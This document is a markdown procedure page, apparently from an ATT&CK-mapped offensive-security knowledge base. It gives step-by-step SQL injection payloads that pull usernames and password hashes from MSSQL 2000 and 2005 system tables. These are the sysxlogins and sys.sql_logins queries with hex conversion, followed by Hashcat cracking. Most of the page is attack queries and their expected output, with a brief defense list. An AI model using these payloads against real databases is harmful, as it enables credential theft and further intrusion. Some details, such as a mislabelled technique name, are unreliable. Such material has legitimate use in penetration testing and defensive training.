---
id: a2226d8e-d717-4eba-9e8a-54cfaa41af42
name: MSSQL-Credential-Theft-via-SQL-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:33.746709+00:00'
updated_at: '2023-04-10T20:22:43.450298+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1190 - Exploitation of Remote
    Services]]
  - >-
    [[techniques/Data from Information Repositories|T1213 - Data from
    Information Repositories]]
sub_techniques: []
tags:
  - '[[tags/MSSQL]]'
  - '[[tags/SQL-Injection]]'
  - '[[tags/Credential-Theft]]'
commands:
  - '[[commands/mssql-2000-select-name-password-sysxlogins]]'
  - '[[commands/mssql-2000-select-name-hex-password-sysxlogins]]'
  - '[[commands/mssql-2005-select-name-password-hash-sql-logins]]'
  - '[[commands/mssql-2005-select-name-hex-password-hash-sql-logins]]'
platforms:
  - Windows
tools: []
validated: true
---

# MSSQL-Credential-Theft-via-SQL-Injection

## Summary

This procedure details how to extract SQL Server login credentials from Microsoft SQL Server (MSSQL) databases versions 2000 and 2005 using SQL injection vulnerabilities. By injecting malicious SELECT queries into vulnerable applications, attackers can query system tables like sysxlogins or sys.sql_logins to retrieve usernames and password hashes, enabling further lateral movement or privilege escalation within the network.

## Description

MSSQL Credential Theft exploits SQL injection flaws in web applications or other interfaces connected to an MSSQL database to execute arbitrary queries against system tables containing authentication data. In MSSQL 2000, credentials are stored in the master..sysxlogins table as varbinary passwords, which can be retrieved directly or converted to hexadecimal for offline cracking. In MSSQL 2005, the master.sys.sql_logins table holds password hashes in varbinary format, often requiring conversion to hex for extraction via error-based SQLi techniques. This method assumes the attacker has identified a blind or error-based SQL injection point with sufficient privileges to access master database tables. Success provides hashed credentials that can be cracked using tools like Hashcat, potentially revealing weak passwords for domain or service accounts. This technique is particularly effective against legacy systems where input validation is absent and default configurations expose system tables.

## Requirements

1. Valid SQL injection vulnerability in an application connected to MSSQL 2000 or 2005.
2. Network access to the target application/database server.
3. Knowledge of the injection point (e.g., login form, search parameter) and ability to inject SQL payloads.
4. Tools for SQL injection exploitation, such as sqlmap or manual tools like Burp Suite.
5. Sufficient database privileges (public role often suffices for sysxlogins access in older versions).

## Defense

- Patch MSSQL servers to current versions and disable unnecessary system table access.
- Implement strict input validation and prepared statements in applications to prevent SQL injection.
- Use Windows Authentication instead of SQL logins where possible, and enforce strong password policies.
- Enable SQL Server auditing for failed queries and monitor for anomalous SELECT statements on system tables.
- Limit database user privileges to least required, revoking access to master database for application accounts.

## Objectives

1. Identify and exploit SQL injection to execute credential extraction queries.
2. Retrieve usernames and password hashes from MSSQL system tables.
3. Use extracted hashes for offline cracking to obtain plaintext credentials for further access.

## Instructions

### Step 1: Identify MSSQL Version

**Context**: Determine if the target is MSSQL 2000 or 2005 to select the appropriate system table, as table structures differ.

Inject a version query via the SQLi point, such as: ```sql
'; SELECT @@VERSION --
```

**Expected Output**: Response containing version info, e.g., "Microsoft SQL Server 2000" or "Microsoft SQL Server 2005".

### Step 2: Extract Credentials from MSSQL 2000 (Direct Password)

**Context**: For MSSQL 2000, query sysxlogins for usernames and passwords directly if stored in plaintext or varbinary format readable via error messages.

**Command** ([[commands/mssql-2000-select-name-password-sysxlogins]]):
```sql
SELECT name, password FROM master..sysxlogins
```

Inject this via SQLi (e.g., in a UNION-based or error-based payload). This retrieves login names and varbinary passwords.

**Expected Output**: Table or error message showing:

name | password
---|---
sa | 0x010500000000000015000000...

> If passwords appear as varbinary, proceed to hex conversion in the next step.

### Step 3: Extract Hex-Converted Passwords from MSSQL 2000

**Context**: Convert varbinary passwords to hexadecimal for extraction in error-based SQLi, as some tools or error messages require hex format for offline analysis.

**Command** ([[commands/mssql-2000-select-name-hex-password-sysxlogins]]):
```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
```

Inject this payload to get hex-encoded hashes.

**Expected Output**: name | master.dbo.fn_varbintohexstr(password)
---|---
sa | 0x010500000000000015000000A8...

> Hex output can be copied directly for cracking with tools like Hashcat using MSSQL hash mode (-m 1731).

### Step 4: Extract Password Hashes from MSSQL 2005

**Context**: For MSSQL 2005, query sys.sql_logins for usernames and raw password hashes.

**Command** ([[commands/mssql-2005-select-name-password-hash-sql-logins]]):
```sql
SELECT name, password_hash FROM master.sys.sql_logins
```

Use this in your SQLi payload to dump the hashes.

**Expected Output**: name | password_hash
---|---
sa | 0x010500000000000015000000...

### Step 5: Extract Hex-Converted Hashes from MSSQL 2005

**Context**: Concatenate name with hex-converted hash for easier parsing in responses or error outputs.

**Command** ([[commands/mssql-2005-select-name-hex-password-hash-sql-logins]]):
```sql
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

Inject to retrieve formatted output.

**Expected Output**: name + '-' + master.sys.fn_varbintohexstr(password_hash)
---
sa-0x010500000000000015000000A8...

> If extraction succeeds, save hashes and attempt cracking. If no results, verify injection point privileges or table access.
